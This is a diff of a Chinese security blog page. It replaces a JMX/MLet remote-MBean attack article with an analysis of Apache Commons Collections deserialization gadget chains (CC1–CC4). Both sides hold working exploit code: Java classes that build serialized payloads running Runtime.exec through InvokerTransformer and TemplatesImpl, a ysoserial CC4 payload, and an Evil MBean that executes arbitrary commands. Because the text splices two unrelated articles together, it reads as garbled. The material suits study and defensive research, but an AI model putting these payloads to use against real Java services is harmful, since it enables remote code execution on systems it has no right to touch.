+<p><code>memberTypes</code>里面存储了注解属性的Class Map，key为属性名，value为属性的类型<br><code>memberValues</code>里面存储了注解属性的Value Map，key为属性名，value为属性的值<br>遍历<code>memberValues</code>，如果memberValue中的key也在memberTypes中，并且value既不是memberType的实例，也不是ExceptionProxy的子类对象，就会调用 setValue 方法写入值。</p>
+<p><code>memberTypes</code>是由<code>annotationType</code>的<code>memberTypes</code>方法得到的，<code>annotationType</code>是由<code>AnnotationType.getInstance(type)</code>得到的，而type和memberValues都是在构造器中传入，type需要是Annotation 实现类的 Class 对象，可控。</p>
+<p><img src="/images/20230425204913.png"></p>
+<p>这样kick-off也有了，完整的Gadget链：</p>
+<ul>
+<li>构造一个 AnnotationInvocationHandler 实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象。</li>
+<li>这个 Map 由 TransformedMap 封装，并调用自定义的 ChainedTransformer 进行装饰。</li>
+<li>ChainedTransformer 中写入多个 Transformer 实现类，用于链式调用，完成恶意操作。</li>
+</ul>
+<p>实现代码：</p>
+<pre><code>public class CC1WithTransformedMap &#123;
+
+    public static String fileName = &quot;CC1withTransformedMap.bin&quot;;
+
+    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException,
+            InstantiationException, IllegalAccessException, IOException &#123;
+
+        Map hashMap = new HashMap();
+        // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
+        // 并且这里的值的一定不是属性值的类型
+        hashMap.put(&quot;comments&quot;, 2);
+
+        // 结合 ChainedTransformer
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;);
+
+
+        Map transformedMap = TransformedMap.decorate(hashMap, null, chain);
+        Class&lt;?&gt; c              = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+
+        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);
+
+        SerializeUtil.write(handler, fileName);
+        SerializeUtil.read(fileName);
     &#125;
 &#125;
 </code></pre>
-<p>拆解：</p>
-<ul>
-<li>Probe Level</li>
-</ul>
-<p>实例化HelloMBean类为mbean</p>
-<blockquote>
-<p>standard MBean：它能管理的资源（包括属性，方法，时间）必须定义在接口中，实例化的MBean必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean。<br>dynamic MBean：必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义。</p>
-</blockquote>
-<p>代码：</p>
-<pre><code>ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
-Hello mbean = new Hello();
-</code></pre>
-<ul>
-<li>Agent Level</li>
-</ul>
-<p>创建了 MBeanServer 实例。<br>主要提供对资源的注册和管理。注册了mbean（具有唯一ObjectName）。</p>
-<pre><code>MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
-mBeanServer.registerMBean(mbean, objectName);
-</code></pre>
-<ul>
-<li>Remote Management Level</li>
-</ul>
-<p>创建了JMXServiceURL，绑定到本地1199端口的RMI服务（基于RMI服务的），关联到MBeanServer。</p>
-<pre><code>Registry registry = LocateRegistry.createRegistry(1199);
-JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
-JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
-jmxConnectorServer.start();
-</code></pre>
-<h2 id="使用jconsole图形工具监视、管理JMX"><a href="#使用jconsole图形工具监视、管理JMX" class="headerlink" title="使用jconsole图形工具监视、管理JMX"></a>使用jconsole图形工具监视、管理JMX</h2><p><code>jconsole</code>是基于JMX的可视化监视、管理工具，该工具是JDK的一部分<br>本地可以通过进程方式进行连接，远程可以通过<code>ip:port</code>方式进行连接。</p>
-<p>我们连接刚刚创建的rmi服务。</p>
-<p><img src="/images/20230601222529.png"></p>
-<p>可以用来获取&#x2F;设置bean属性，或调用方法。</p>
-<h1 id="攻击一：使用Melt加载远程MBean"><a href="#攻击一：使用Melt加载远程MBean" class="headerlink" title="攻击一：使用Melt加载远程MBean"></a>攻击一：使用Melt加载远程MBean</h1><h2 id="介绍MLet"><a href="#介绍MLet" class="headerlink" title="介绍MLet"></a>介绍MLet</h2><p>Mlet是一个类：<code>javax.management.loading.MLet</code>，这是一个mbean（实现接口<code>MLetMBean</code>）。该mbean存在一个方法<code>getMBeansFromURL</code>，可以从远程<code>mlet server</code>加载mbean。</p>
-<p><img src="/images/20230601224936.png"></p>
-<p>所以利用Melt攻击流程总结如下：</p>
+<p><code>Generated.class</code>可以替换为任意注解类，只要修改<code>memberValues</code>的key为注解类的一个属性名就行。</p>
+<h2 id="LazyMap思路"><a href="#LazyMap思路" class="headerlink" title="LazyMap思路"></a>LazyMap思路</h2><p>LazyMap 通过 <strong>get</strong> 方法获取不到 key 的时候触发 Transformer。<br>而<code> AnnotationInvocationHandler</code>的invoke方法可以触发 memberValues 的 <strong>get</strong> 方法。</p>
+<p><img src="/images/20230425210027.png"></p>
+<p>这里用到了动态代理，被动态代理的对象调用任意方法都会调用对应的InvocationHandler 的 <code>invoke</code> 方法。</p>
+<p>构造思路,在使用带有装饰器的 LazyMap 初始化 AnnotationInvocationHandler 之前，先使用 InvocationHandler 代理一下 LazyMap，这样反序列化 AnnotationInvocationHandler 时，调用 LazyMap 值的 任意方法之前会调用代理类的 invoke 方法，触发 LazyMap 的 get 方法。</p>
+<p>有点乱，整理一下：</p>
+<p>反序列化调用readObject方法，readObject方法中memberValues存放着我们LazyMap用InvocationHandler代理的代理类，当执行到memberValues.entrySet()方法时，触发InvocationHandler的invoke方法</p>
+<p><img src="/images/20230425214833.png"></p>
+<p>invoke方法中，会去调用<code>memberValues.get(member)</code>也就是我们LazyMap的get方法，由于map中没有entrySet这个key，触发chain链</p>
+<p><img src="/images/20230425215420.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC1 链分析的全部内容了，最后总结一下。</p>
 <ol>
-<li>MBeanServer中存在MLet的MBean</li>
-<li>利用MLet方法去加载我们恶意server中的Mlet文件</li>
-<li>Mlet文件中写入我们恶意jar包服务，被加载</li>
-<li>jar包中的恶意Mbean被加载进MBeanServer</li>
-<li>通过JMX调用恶意MBean的方法</li>
+<li>利用说明：<ul>
+<li>利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get&#x2F;set 等操作，配合 TransformedMap&#x2F;LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，最后结合了 ChainedTransformer 的链式调用、InvokerTransformer 的反射执行完成了恶意调用链的构成。其中 LazyMap 的触发还用到了动态代理机制。</li>
+</ul>
+</li>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.functors.ChainedTransformer#transform()</code></li>
+</ul>
+</li>
 </ol>
-<h2 id="攻击示例与分析"><a href="#攻击示例与分析" class="headerlink" title="攻击示例与分析"></a>攻击示例与分析</h2><p>创建恶意jar文件，用于命令执行</p>
-<p>EvilMBean.java:</p>
-<pre><code>public interface EvilMBean &#123;
-    String runCommand(String cmd);
+<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="依赖版本"><a href="#依赖版本" class="headerlink" title="依赖版本"></a>依赖版本</h2><pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
+<p>因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。<br>s<br>PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 <code>queue</code> 中之后，会调用 <code>heapify()</code> 方法来对数据进行排序。</p>
+<p><img src="/images/20230425215752.png"></p>
+<p><code>heapify()</code> 方法调用 <code>siftDown()</code> 方法，在 comparator 属性不为空的情况下，调用 <code>siftDownUsingComparator()</code> 方法</p>
+<p><img src="/images/20230425215850.png"></p>
+<p><img src="/images/20230425215843.png"></p>
+<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。</p>
+<p><img src="/images/20230425220033.png"></p>
+<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</p>
+<p>TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。</p>
+<p>TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 <code>ComparableComparator.&lt;Comparable&gt;comparableComparator()</code>。</p>
+<p><img src="/images/20230425220323.png"></p>
+<p>在调用 TransformingComparator 的 <code>compare</code> 方法时，可以看到调用了 <code>this.transformer.transform()</code> 方法对要比较的两个值进行转换，然后再调用 compare 方法比较。</p>
+<p><img src="/images/20230425220202.png"></p>
+<h2 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h2><ul>
+<li>kick-off点：PriorityQueue</li>
+<li>chain点：ChainedTransformer</li>
+<li>sink点：InvokerTransformer</li>
+</ul>
+<p>代码如下</p>
+<pre><code>public class CC2WithChain &#123;
+
+    public static String fileName = &quot;CC2WithChain.bin&quot;;
+
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;
+
+        // 初始化 Transformer
+        ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;));
+
+        TransformingComparator comparator = new TransformingComparator(chain);
+
+        // 在初始化时不带入 comparator，而是
+        PriorityQueue&lt;String&gt; queue = new PriorityQueue&lt;&gt;(2);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue, comparator);
+
+        SerializeUtil.write(queue, fileName);
+        SerializeUtil.read(fileName);
+    &#125;
+
 &#125;
 </code></pre>
-<p>Evil.java:</p>
-<pre><code>public class Evil implements EvilMBean&#123;
+<p>这里需要注意的是，在初始化 PriorityQueue 时没有指定 comparator，而是使用反射写入，这是为了避免在向 queue 中添加内容时触发排序而导致触发恶意 payload。</p>
+<h2 id="ysoserial-CC2"><a href="#ysoserial-CC2" class="headerlink" title="ysoserial CC2"></a>ysoserial CC2</h2><p>ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode。</p>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>TemplatesImpl 类位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，实现了 Serializable 接口，因此它可以被序列化。</p>
+<p>看到<code>newTransformer</code>，调用了<code>getTransletInstance()</code> 方法。</p>
+<p><img src="/images/20230425221326.png"></p>
+<p>该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化，如果<code>_class</code>、<code>_transletIndex</code>可控，就可以自定义实例化的类。</p>
+<p><img src="/images/20230425221632.png"></p>
+<p>看到<code>defineTransletClasses()</code>方法，会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> ，并且如果这个类的父类为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，就会将类成员属性的<code>_transletIndex</code> 设置为当前的i。而<code>defineTransletClasses()</code>在之前<code>getTransletInstance()</code>类中_class不为空时调用，所以形成了可控的调用链。</p>
+<p><img src="/images/!%5B%5D(images/20230425221743.png).png"></p>
+<p>触发逻辑总结：</p>
+<ul>
+<li>创建恶意的 TemplatesImpl 对象，写入 _bytecodes、_name 属性，完成调用 newTransformer 方法触发恶意类的实例化的条件。</li>
+<li>创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中。</li>
+<li>使用 InvokerTransformer （调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中。</li>
+</ul>
+<p>恶意代码：</p>
+<pre><code>public class CC2WithTemplatesImpl &#123;
+
+    public static String fileName = &quot;CC2WithTemplatesImpl.bin&quot;;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+
+        // 读取恶意类 bytes[]
+        InputStream inputStream = CC2WithTemplatesImpl.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
+        byte[]      bytes       = new byte[inputStream.available()];
+        inputStream.read(bytes);
+
+        // 初始化 PriorityQueue
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+
+
+        // 初始化 TemplatesImpl 对象
+        TemplatesImpl tmpl      = new TemplatesImpl();
+        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
+        // _name 不能为空
+        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(tmpl, &quot;1azy&quot;);
+
+        Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+        field.setAccessible(true);
+        Object[] objects = (Object[]) field.get(queue);
+        objects[0] = tmpl;
+
+        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
+        // 这个类是 public 的，方便调用
+        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
+        TransformingComparator comparator  = new TransformingComparator(transformer);
+
+        Field field2 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field2.setAccessible(true);
+        field2.set(queue, comparator);
+
+        SerializeUtil.write(queue, fileName);
+        SerializeUtil.read(fileName);
+
+    &#125;
+&#125;
+
+恶意类构造如下，请先编译成class文件：
+
+public class ClassForCC2 extends AbstractTranslet &#123;
+    static &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+
+    public static void main(String[] args) &#123;
+
+    &#125;
+
+
+
     @Override
-    public String runCommand(String cmd) &#123;
-        try &#123;
-            Runtime rt = Runtime.getRuntime();
-            Process proc = rt.exec(cmd);
-            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
-            String stdout_err_data = &quot;&quot;;
-            String s;
-            while ((s = stdInput.readLine()) != null)
-            &#123;
-                stdout_err_data += s+&quot;\n&quot;;
-            &#125;
-            while ((s = stdError.readLine()) != null)
-            &#123;
-                stdout_err_data += s+&quot;\n&quot;;
-            &#125;
-            proc.waitFor();
-            return stdout_err_data;
-        &#125;
-        catch (Exception e)
-        &#123;
-            return e.toString();
-        &#125;
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
     &#125;
 &#125;
 </code></pre>
-<p>创建MLet文件，用于指向我们恶意jar包服务</p>
-<p><code>mlet.txt</code>:</p>
-<pre><code>&lt;html&gt;&lt;mlet code=&quot;Evil&quot; archive=&quot;Evil.jar&quot; name=&quot;MLetCompromise:name=evil,id=1&quot; codebase=&quot;http://127.0.0.1:8000&quot;&gt;&lt;/mlet&gt;&lt;/html&gt;
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>利用说明：<ul>
+<li>利用 PriorityQueue 在反序列化后会对队列进行优先级排序的特点，为其指定 TransformingComparator 排序方法，并在其中为其添加 Transforer，与 CC1 类似，主要的触发位置还是 InvokerTransformer。</li>
+</ul>
+</li>
+<li>Gadget 总结：<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections4.comparators.TransformingComparator#compare()</code></li>
+</ul>
+</li>
+</ol>
+<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。</p>
+<p>在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。</p>
+<p>在 CC2 中，使用 TemplatesImpl 的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。</p>
+<p>而在 CC3 中，使用了 CC1 和 LazyMap 和 CC3 的 TemplatesImpl，中间寻找了其他的触发 newTransformer 的实现方式。</p>
+<h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>在 SAX API 中提供了一个过滤器接口 <code>org.xml.sax.XMLFilter</code>，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates&#x2F;TransformerImpl&#x2F;TransformerHandlerImpl 属性，</p>
+<p>TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了。</p>
+<p><img src="/images/20230425222728.png"></p>
+<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>有了上述 gadget ，接下来的重点就是需要我们实例化这个 TrAXFilter，实例化我们当然可以使用 InvokerTransformer 反射拿到 Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。</p>
+<p>Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 <code>transform()</code> 方法实际上接收一个 Class 类型的对象，通过 <code>getConstructor</code> 获取构造方法，并通过 <code>newInstance</code> 创建类实例。</p>
+<p><img src="/images/20230425222809.png"></p>
+<p>反射需要的 iParamTypes 参数类型、iArgs 参数值则在 InstantiateTransformer 初始化时赋值。</p>
+<p><img src="/images/20230425222822.png"></p>
+<h2 id="构造攻击-1"><a href="#构造攻击-1" class="headerlink" title="构造攻击"></a>构造攻击</h2><pre><code>public class CC3 &#123;
+
+    public static String fileName = &quot;CC3.bin&quot;;
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;
+
+        // 读取恶意类 bytes[]
+        InputStream inputStream = CC3.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
+        byte[]      bytes       = new byte[inputStream.available()];
+        inputStream.read(bytes);
+
+        // 初始化 TemplatesImpl 对象
+        TemplatesImpl tmpl      = new TemplatesImpl();
+        Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
+        // _name 不能为空
+        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(tmpl, &quot;su18&quot;);
+
+
+        // 结合 ChainedTransformer
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)
+        &#125;);
+
+        // 初始化 LazyMap
+        Map lazyMap     = LazyMap.decorate(new HashMap(),  chain);
+        Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+
+        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
+        // 创建LazyMap的动态代理类实例
+        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
+
+        // 使用动态代理初始化 AnnotationInvocationHandler
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);
+
+        SerializeUtil.write(invocationHandler, fileName);
+        SerializeUtil.read(fileName);
+    &#125;
+
+&#125;
 </code></pre>
-<p><code>Evil&quot;</code>为恶意mbean的路径；</p>
-<p><code>archive=&quot;Evil.jar&quot;</code>为恶意mbean的jar包；</p>
-<p><code>name=&quot;MLetCompromise:name=evil,id=1&quot;</code>可自定义，遵循OBjectname规则；</p>
-<p><code>codebase=&quot;http://127.0.0.1:8000&quot;</code>访问为jar包的url。</p>
-<p>将Evil.jar和mlet.txt放在同一目录，<code>python3 -m http.server 8000</code>启动web服务。</p>
-<p>受害者MBeanServer：</p>
-<pre><code>public class MeltJMXDemo &#123;
+<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="依赖版本-1"><a href="#依赖版本-1" class="headerlink" title="依赖版本"></a>依赖版本</h2><pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>ysoserial的CC4是CC2和CC3的结合，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer（CC2），而chain中利用了 InstantiateTransformer 实例化 TrAXFilter 类，并调用 TemplatesImpl 的 newTransformer 方法实例化恶意类字节码触发漏洞（CC3）<br>。</p>
+<pre><code>public class CommonsCollections4 implements ObjectPayload&lt;Queue&lt;Object&gt;&gt; &#123;
+
+    public Queue&lt;Object&gt; getObject(final String command) throws Exception &#123;
+        Object templates = Gadgets.createTemplatesImpl(command);
+
+        ConstantTransformer constant = new ConstantTransformer(String.class);
+
+        // mock method name until armed
+        Class[] paramTypes = new Class[] &#123; String.class &#125;;
+        Object[] args = new Object[] &#123; &quot;foo&quot; &#125;;
+        InstantiateTransformer instantiate = new InstantiateTransformer(
+                paramTypes, args);
+
+        // grab defensively copied arrays
+        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, &quot;iParamTypes&quot;);
+        args = (Object[]) Reflections.getFieldValue(instantiate, &quot;iArgs&quot;);
+
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; constant, instantiate &#125;);
+
+        // create queue with numbers
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(chain));
+        queue.add(1);
+        queue.add(1);
+
+        // swap in values to arm
+        Reflections.setFieldValue(constant, &quot;iConstant&quot;, TrAXFilter.class);
+        paramTypes[0] = Templates.class;
+        args[0] = templates;
+
+        return queue;
+    &#125;
+</code></pre>
+<p>这里补充一个对 PriorityQueue 的替代链 TreeBag。</p>
+<h2 id="补充前置知识"><a href="#补充前置知识" class="headerlink" title="补充前置知识"></a>补充前置知识</h2><h3 id="TreeBag-amp-TreeMap"><a href="#TreeBag-amp-TreeMap" class="headerlink" title="TreeBag &amp; TreeMap"></a>TreeBag &amp; TreeMap</h3><p>在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。</p>
+<p>除了 PriorityQueue，还能否找到其他的提供排序的类，在反序列化时会调用到比较器呢？于是找到了 TreeBag。</p>
+<p>对于 Bag 我很陌生，所以这里简单介绍一下。</p>
+<p>Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。</p>
+<p>TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。</p>
+<p>TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。</p>
+<p>看到TreeBag#readObject，会调用super.doReadObject</p>
+<p><img src="/images/20230504160412.png"></p>
+<p>调用 put 向 TreeMap中存放数据</p>
+<p><img src="/images/20230504160549.png"></p>
+<p>在TreeMap#put中会调用compare去比较key</p>
+<p><img src="/images/20230504160703.png"></p>
+<p>而compare中就会调用<code>comparator</code> 进行比较，可以使用 <code>TransformingComparator</code> 触发后续的逻辑。</p>
+<p><img src="/images/20230504160744.png"></p>
+<h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC4WithTreeBag &#123;
+
+    public static String fileName = &quot;CC4WithTreeBag.bin&quot;;
+
     public static void main(String[] args) throws Exception &#123;
-        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
-        MLet mLet = new MLet();
-        ObjectName objectNameMLet = new ObjectName(&quot;JMXMLet:type=MLet&quot;);
-        mBeanServer.registerMBean(mLet, objectNameMLet);
 
-        Registry registry = LocateRegistry.createRegistry(1199);
+        // 读取恶意类 bytes[]
+        InputStream inputStream = CC4WithTreeBag.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
+        byte[]      bytes       = new byte[inputStream.available()];
+        inputStream.read(bytes);
 
-        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
-        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
-        jmxConnectorServer.start();
-        System.out.println(&quot;MeltJMXServer start...&quot;);
+        // 初始化 TemplatesImpl 对象
+        TemplatesImpl tmpl      = new TemplatesImpl();
+        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
+        // _name 不能为空
+        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(tmpl, &quot;1azy&quot;);
+
+        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
+        // 这个类是 public 的，方便调用
+        Transformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
+        TransformingComparator comparator  = new TransformingComparator(transformer);
+
+        // prepare CommonsCollections object entry point
+        TreeBag tree = new TreeBag(comparator);
+        tree.add(tmpl);
+
+        Field field = InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);
+        field.setAccessible(true);
+        field.set(transformer, &quot;newTransformer&quot;);
+
+        SerializeUtil.write(tree, fileName);
+        SerializeUtil.read(fileName);
     &#125;
 &#125;
 </code></pre>
-<p>通过jconsole攻击：</p>
-<p>本地起一个server，目录下包含我们的恶意melt文件和jar包</p>
